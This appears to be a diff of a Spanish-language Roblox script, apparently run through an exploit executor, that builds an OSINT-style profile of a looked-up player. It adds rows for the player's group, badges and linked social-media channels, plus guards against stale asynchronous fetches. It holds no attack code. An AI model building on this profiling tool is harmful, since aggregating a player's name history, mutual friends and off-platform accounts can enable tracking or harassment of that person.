+			div.BackgroundColor3 = C.divider; div.BackgroundTransparency = 0.5
+			div.BorderSizePixel = 0
+			themed(div, "BackgroundColor3", "divider")
+
 			if ANIM.enabled and not skipEntrance then
-				local delay = cellStagger * 0.05
+				local delay = cellStagger * 0.04
 				cellStagger = cellStagger + 1
 				cell.BackgroundTransparency = 1
-				local cStroke = cell:FindFirstChildOfClass("UIStroke")
-				if cStroke then cStroke.Transparency = 1 end
+				div.BackgroundTransparency = 1
 				for _, ch in ipairs(cell:GetChildren()) do
 					if ch:IsA("TextLabel") then ch.TextTransparency = 1 end
 					if ch:IsA("ImageLabel") then ch.ImageTransparency = 1 end
 				end
 				task.delay(delay, function()
 					if not cell.Parent then return end
-					local info = TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
-					motionTween(cell, info, { BackgroundTransparency = 0 })
-					if cStroke then TweenService:Create(cStroke, info, { Transparency = 0.6 }):Play() end
+					local info = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+					TweenService:Create(div, info, { BackgroundTransparency = 0.5 }):Play()
 					for _, ch in ipairs(cell:GetChildren()) do
 						if ch:IsA("TextLabel") then TweenService:Create(ch, info, { TextTransparency = 0 }):Play() end
 						if ch:IsA("ImageLabel") then TweenService:Create(ch, info, { ImageTransparency = 0 }):Play() end
@@ -8638,6 +8859,72 @@ local function render(data, skipEntrance)
 		makeInfoCell(NXI.creacion    or "", "Creación",        data.Created or "\226\128\148",   7)
 		makeInfoCell(NXI.edad        or "", "Edad de cuenta",  data.AccountAge or "\226\128\148", 8)
 		makeInfoCell(NXI.link        or "", "Enlace al perfil", data.ProfileUrl,                 9, data.ProfileUrl, nil, "link")
+		if data.PrimaryGroup and data.PrimaryGroup.group then
+			local g = data.PrimaryGroup.group
+			local r = data.PrimaryGroup.role
+			local txt = (g.name or "?")
+			if r and r.name then txt = txt .. " (" .. r.name .. ")" end
+			makeInfoCell("", "Grupo Principal", txt, 10, nil, nil, nil)
+		end
+		-- Ocultar divider de la última fila
+		local lastCell = nil
+		for _, ch in ipairs(idGrid:GetChildren()) do
+			if ch:IsA("Frame") and ch.LayoutOrder and (not lastCell or ch.LayoutOrder > lastCell.LayoutOrder) then
+				lastCell = ch
+			end
+		end
+		if lastCell then
+			for _, ch in ipairs(lastCell:GetChildren()) do
+				if ch:IsA("Frame") and ch.Size.Y.Offset == 1 then
+					ch:Destroy()
+					break
+				end
+			end
+		end
+	end
+
+	if data.RobloxBadges and #data.RobloxBadges > 0 then
+		local names = {}
+		for _, b in ipairs(data.RobloxBadges) do
+			if type(b) == "table" and b.name then
+				table.insert(names, b.name)
+			end
+		end
+		if #names > 0 then
+			local badgeLbl = Instance.new("TextLabel", idCard)
+			badgeLbl.LayoutOrder = 50
+			badgeLbl.Size = UDim2.new(1, 0, 0, 22)
+			badgeLbl.BackgroundTransparency = 1
+			badgeLbl.Font = Enum.Font.GothamMedium
+			badgeLbl.TextSize = DS.text.sm
+			badgeLbl.TextColor3 = C.accent
+			badgeLbl.TextXAlignment = Enum.TextXAlignment.Left
+			badgeLbl.Text = "Insignias: " .. table.concat(names, ", ")
+			themed(badgeLbl, "TextColor3", "accent")
+		end
+	end
+
+	if data.PromotionChannels then
+		local channels = {}
+		for platform, value in pairs(data.PromotionChannels) do
+			if type(value) == "string" and value ~= "" then
+				table.insert(channels, platform .. ": " .. value)
+			end
+		end
+		if #channels > 0 then
+			local promoLbl = Instance.new("TextLabel", idCard)
+			promoLbl.LayoutOrder = 51
+			promoLbl.Size = UDim2.new(1, 0, 0, 22)
+			promoLbl.BackgroundTransparency = 1
+			promoLbl.Font = Enum.Font.Gotham
+			promoLbl.TextSize = DS.text.sm
+			promoLbl.TextColor3 = C.subtext
+			promoLbl.TextXAlignment = Enum.TextXAlignment.Left
+			promoLbl.TextWrapped = true
+			promoLbl.AutomaticSize = Enum.AutomaticSize.Y
+			promoLbl.Text = "Redes: " .. table.concat(channels, " · ")
+			themed(promoLbl, "TextColor3", "subtext")
+		end
 	end
 
 	-- Description card
@@ -8682,7 +8969,9 @@ local function render(data, skipEntrance)
 		if data._namesInflight then return end
 		data._namesInflight = true
 		task.spawn(function()
+			if searchGen ~= renderGen then return end
 			local names, hasMore = getNameHistory(data.UserId)
+			if searchGen ~= renderGen then return end
 			data._namesCached = names or false
 			data._namesHasMore = hasMore or false
 			data._namesInflight = false
@@ -8789,8 +9078,8 @@ local function render(data, skipEntrance)
 	-- ---------- PESTAÑA ESTADÍSTICAS ----------
 	local statsCard = DS.makeCard(statsScroll, {order = 0, title = "Estadísticas"})
 	animateCardIn(statsCard, 0.0)
-	DS.makeDataRow(statsCard, "Amigos", tostring(data.Friends or "—"), {order = 1})
-	addFriendsDropdown(statsScroll, data, 5)
+	DS.makeDataRow(statsCard, "Amigos", data.Friends ~= nil and tostring(data.Friends) or "\226\128\148", {order = 1})
+	-- addFriendsDropdown(statsScroll, data, 5) -- desactivado: lista requiere auth que el executor no soporta
 	DS.makeDataRow(statsCard, "Seguidores", tostring(data.Followers or "—"), {order = 2})
 	DS.makeDataRow(statsCard, "Siguiendo", tostring(data.Following or "—"), {order = 3})
 	DS.makeDataRow(statsCard, "Grupos", tostring(data.Groups or "—"), {order = 4})
@@ -8864,11 +9153,11 @@ local function render(data, skipEntrance)
 		statusLabel.Text = prepMsg
 		local wantFor = data.UserId
 		task.spawn(function()
+			if searchGen ~= renderGen then return end
 			local names, hasMore = getNameHistory(data.UserId)
+			if searchGen ~= renderGen then return end
 			data._namesCached = names or false
 			data._namesHasMore = hasMore or false
-			-- Si cambiaste de perfil mientras se pedía, no copiamos ni
-			-- pisamos el estado del perfil nuevo.
 			if currentData and currentData.UserId ~= wantFor then return end
 			after()
 		end)
@@ -8934,6 +9223,7 @@ local function render(data, skipEntrance)
 
 	local itemsFor = data.UserId
 	task.spawn(function()
+		if searchGen ~= renderGen then return end
 		local items, total
 		if data._itemsCached ~= nil then
 			items = data._itemsCached or nil
@@ -8991,6 +9281,7 @@ local function render(data, skipEntrance)
 	end)
 
 	task.spawn(function()
+		if searchGen ~= renderGen then return end
 		local groups
 		if data._groupsCached ~= nil then
 			groups = data._groupsCached or nil
@@ -9023,6 +9314,7 @@ local function render(data, skipEntrance)
 	end)
 
 	task.spawn(function()
+		if searchGen ~= renderGen then return end
 		local badges
 		if data._badgesCached ~= nil then
 			badges = data._badgesCached or nil
@@ -9065,10 +9357,11 @@ local function render(data, skipEntrance)
 		if data._rapInflight then return end       -- ya hay una petición en curso
 		data._rapInflight = true
 		task.spawn(function()
+			if searchGen ~= renderGen then return end
 			local rap, motivo = getRAP(data.UserId)
-			data._rapMotivo = motivo          -- por qué falta (lo lee la tarjeta)
+			if searchGen ~= renderGen then return end
+			data._rapMotivo = motivo
 			local val = rap and tonumber(rap.rap) or nil
-			-- El RAP también se valida: un valor negativo o no numérico se descarta.
 			if Shield.flags.data and val ~= nil and (val < 0 or val ~= math.floor(val)) then
 				val = nil
 			end
@@ -9081,6 +9374,7 @@ local function render(data, skipEntrance)
 	end
 
 	task.spawn(function()
+		if searchGen ~= renderGen then return end
 		local rapVal
 		do
 			local hecho, valor = false, nil
@@ -9247,6 +9541,12 @@ local function render(data, skipEntrance)
 				tOpen = not tOpen
 				tBody.Visible = tOpen
 				tToggle.Text = tOpen and "▾ Ocultar" or "Detalle ▸"
+				task.defer(function()
+					if tCard and tCard.Parent then
+						tCard.AutomaticSize = Enum.AutomaticSize.None
+						tCard.AutomaticSize = Enum.AutomaticSize.Y
+					end
+				end)
 			end)
 		end
 
@@ -9311,6 +9611,12 @@ local function render(data, skipEntrance)
 				aOpen = not aOpen
 				aBody.Visible = aOpen
 				aToggle.Text = aOpen and "▾ Ocultar" or "Detalle ▸"
+				task.defer(function()
+					if aCard and aCard.Parent then
+						aCard.AutomaticSize = Enum.AutomaticSize.None
+						aCard.AutomaticSize = Enum.AutomaticSize.Y
+					end
+				end)
 			end)
 		end
 	end
@@ -9324,11 +9630,13 @@ local function render(data, skipEntrance)
 	if data.UserId ~= player.UserId then
 		local renderedFor = data.UserId
 		task.spawn(function()
+			if searchGen ~= renderGen then return end
 			local mutual
 			if data._mutualCached ~= nil then
 				mutual = data._mutualCached or nil
 			else
 				mutual = getMutualFriends(data.UserId)
+				if searchGen ~= renderGen then return end
 				data._mutualCached = mutual or false
 			end
 			if currentData == nil or currentData.UserId ~= renderedFor then return end
@@ -9419,7 +9727,7 @@ do
 	end
 	onRepaint(paintThemeButtons)
 
-	local themeOrderNormal = { "arctic", "tor", "negro", "rosa" }
+	local themeOrderNormal = { "nx", "arctic", "tor", "negro", "rosa" }
 	local themeOrderBeta   = {}
 
 	local function makeThemeBtn(parent, tn, order)
@@ -9752,6 +10060,7 @@ do
 					fixes = fixes + 1
 					log[#log + 1] = "✓ NXIcons: " .. #failed .. " iconos reintentando en background"
 					task.spawn(function()
+						if searchGen ~= renderGen then return end
 						local li = getsynasset or getcustomasset
 						if type(li) ~= "function" then return end
 						for _, key in ipairs(failed) do
@@ -10562,6 +10871,7 @@ analyze = function(input)
 	clearScroll(statsScroll)
 	clearScroll(itemsScroll)
 	clearScroll(analysisScroll)
+	cancelAllInfinites()
 	if _G.NXOSINT and _G.NXOSINT.reset then pcall(_G.NXOSINT.reset) end
 	if _G.NXIntel and _G.NXIntel.reset then pcall(_G.NXIntel.reset) end
 	NXWin.startScan()
